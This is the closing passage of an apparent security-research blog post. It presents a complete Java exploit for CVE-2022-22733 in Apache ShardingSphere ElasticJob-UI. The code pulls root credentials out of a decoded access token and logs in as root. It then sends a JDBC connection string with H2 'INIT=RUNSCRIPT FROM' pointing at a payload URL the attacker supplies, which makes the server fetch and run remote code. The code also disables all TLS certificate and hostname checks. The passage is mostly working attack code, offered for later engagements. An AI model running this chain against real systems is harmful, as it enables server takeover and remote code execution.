<p>Here is the code for our final step and it’s not a big different as we already familiar with the <code class="language-plaintext highlighter-rouge">HTTP</code> connection and with sending &amp; parsing response data. Now, Before we test the full code let’s add some <code class="language-plaintext highlighter-rouge">try</code> &amp; <code class="language-plaintext highlighter-rouge">catch</code> to handle exceptions &amp; also skip the <code class="language-plaintext highlighter-rouge">SSL</code> verifications.</p>

<p>Full Code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import org.json.JSONObject;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        System.out.print("[*] CVE-2022-22733 Exploit By: Zeyad Azima\nWebsite: https://zeyadazima.com\nGithub: https://github.com/Zeyad-Azima\n");
        System.out.println("");
        System.out.println("");
        try {
            Scanner scanner = new Scanner(System.in);
            System.out.print("[+] Enter host: ");
            String host = scanner.nextLine();
            System.out.print("[+] Enter port: ");
            String port = scanner.nextLine();
            System.out.print("[+] Enter username: ");
            String username = scanner.nextLine();
            System.out.print("[+] Enter password: ");
            String password = scanner.nextLine();
            System.out.print("[+] Enter payload URL for JDBC Attack: ");
            String JDBC = scanner.nextLine();
            scanner.close();


            String url = "http://" + host + ":" + port + "/api/login";
            URL obj = new URL(url);


            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
            } };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -&gt; true);


            HttpURLConnection testCon = (HttpURLConnection) obj.openConnection();
            testCon.setRequestMethod("HEAD");
            int responseCodeTest = testCon.getResponseCode();
            if (responseCodeTest != HttpURLConnection.HTTP_OK) {
                System.out.println("[-] Connection error: " + responseCodeTest);
                return;
            }


            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con.setRequestProperty("Accept", "application/json, text/plain, */*");
            con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con.setRequestProperty("Access-Token", "");
            con.setRequestProperty("Origin", "http://" + host + ":" + port);
            con.setRequestProperty("DNT", "1");
            con.setRequestProperty("Connection", "close");
            con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String body = "{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}";
            con.setDoOutput(true);
            con.getOutputStream().write(body.getBytes("UTF-8"));
            int responseCode = con.getResponseCode();
            System.out.println("[*] LOGIN Response Code: " + responseCode);
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            JSONObject jsonObject = new JSONObject(response.toString());
            JSONObject model = jsonObject.getJSONObject("model");
            String accessToken = model.getString("accessToken");
            //String decodedToken = new String(Base64.getDecoder().decode(accessToken));
            byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
            String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);


            JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);

            String rootUsername = "";
            String rootPassword = "";
            if (decodedJsonObject.has("rootUsername") &amp;&amp; decodedJsonObject.has("rootPassword")) {
                rootUsername = decodedJsonObject.getString("rootUsername");
                rootPassword = decodedJsonObject.getString("rootPassword");
                System.out.println("[*] Root username: " + rootUsername);
                System.out.println("[*] Root password: " + rootPassword);
            } else {
                System.out.println("Access token does not contain rootUsername and rootPassword keys.");
            }

            // second login request with root credentials
            HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod("POST");
            con3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con3.setRequestProperty("Accept", "application/json, text/plain, */*");
            con3.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con3.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con3.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con3.setRequestProperty("Access-Token", "");
            con3.setRequestProperty("Origin", "http://" + host + ":" + port);
            con3.setRequestProperty("DNT", "1");
            con3.setRequestProperty("Connection", "close");
            con3.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String requestBody3 = "{\"username\":\"" + rootUsername + "\",\"password\":\"" + rootPassword + "\"}";
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes("UTF-8"));
            int responseCode3 = con3.getResponseCode();
            System.out.println("[*] Root Login Response Code: " + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject("model");
            String accessToken3 = model3.getString("accessToken");
            System.out.println("[*] Root Access Token: " + accessToken3);

            // JDBC Attack
            String url2 = "http://" + host + ":" + port + "/api/data-source/connectTest";
            String requestBody = "{\"name\":\"azima\",\"driver\":\"org.h2.Driver\",\"url\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+JDBC+"'\",\"username\":\"a\",\"password\":\"a\"}";

            URL obj2 = new URL(url2);
            HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


            con2.setRequestMethod("POST");
            con2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con2.setRequestProperty("Accept", "application/json, text/plain, */*");
            con2.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con2.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con2.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con2.setRequestProperty("Access-Token", accessToken3);
            con2.setRequestProperty("Origin", "http://" + host + ":" + port);
            con2.setRequestProperty("DNT", "1");
            con2.setRequestProperty("Connection", "close");
            con2.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            con2.setDoOutput(true);


            DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
            wr.writeBytes(requestBody);
            wr.flush();
            wr.close();

            int responseCode2 = con2.getResponseCode();
            System.out.println("[*] JDBC Attack Response Code : " + responseCode2);
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
            String inputLine2 = "";
            StringBuffer response2 = new StringBuffer();

            while ((inputLine2 = in2.readLine()) != null) {
                response2.append(inputLine2);
            }
            in2.close();


            JSONObject jsonObject2 = new JSONObject(response2.toString());
            System.out.println("[*] JDBC Attack Response: " + jsonObject2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre></div></div>

<p>And here is our full code after the edits, let’s try it out:</p>

<p><img src="/assets/images/728ff6f5288f4df9f54de3dd662c5fe4" alt="" /></p>

<p> </p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>Now, We have a full chain of the steps and created our exploit. We can now use it in our next coming engement when we find <code class="language-plaintext highlighter-rouge">Apache ShardingSphere ElasticJob-UI</code> running. You can find the full code on my github from <a href="https://github.com/Zeyad-Azima/CVE-2022-22733">here</a>.</p>

<h2 id="resources"><strong>Resources</strong></h2>

<ul>
  <li>
    <p>https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/</p>
  </li>
  <li>
    <p>https://github.com/Zeyad-Azima/CVE-2022-22733</p>
  </li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#security-research" class="page__taxonomy-item" rel="tag">Security Research</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-05-01T00:00:00+08:00">May 1, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/security%20research/CVE_2022_22733/" class="pagination--pager" title="CVE-2022-22733: Apache ShardingSphere ElasticJob-UI privilege escalation
">Previous</a>
    
    
      <a href="/security%20research/CVE_2021_45232/" class="pagination--pager" title="CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
